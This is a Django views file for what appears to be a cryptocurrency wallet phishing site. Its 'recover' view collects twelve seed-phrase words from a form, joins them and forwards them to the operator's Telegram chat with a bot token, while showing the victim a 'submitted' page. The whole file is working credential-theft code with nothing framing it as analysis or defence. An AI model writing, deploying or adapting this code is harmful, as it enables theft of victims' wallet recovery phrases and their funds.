from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .process import send_telegram_message
from .config import CHAT_ID, TELEGRAM_TOKEN

# Create your views here.
def index(request):
    return render(request, 'index.html', {'mode':'init'})

def recover(request):
    if request.method == 'POST':
        phrase1 = request.POST['phrase_1']
        phrase2 = request.POST['phrase_2']
        phrase3 = request.POST['phrase_3']
        phrase4 = request.POST['phrase_4']
        phrase5 = request.POST['phrase_5']
        phrase6 = request.POST['phrase_6']
        phrase7 = request.POST['phrase_7']
        phrase8 = request.POST['phrase_8']
        phrase9 = request.POST['phrase_9']
        phrase10 = request.POST['phrase_10']
        phrase11 = request.POST['phrase_11']
        phrase12 = request.POST['phrase_12']
        final_phrase = ','.join([phrase1,phrase2,phrase3,phrase4,phrase5,phrase6,phrase7,phrase8,phrase9,phrase10,phrase11,phrase12])
        
        alert = '*New phrase submitted*  \nPhrase: *{}*'.format(final_phrase)
        print(alert)
        send_telegram_message(alert, CHAT_ID, TELEGRAM_TOKEN)
        return render(request, 'index.html', {'submitted':True})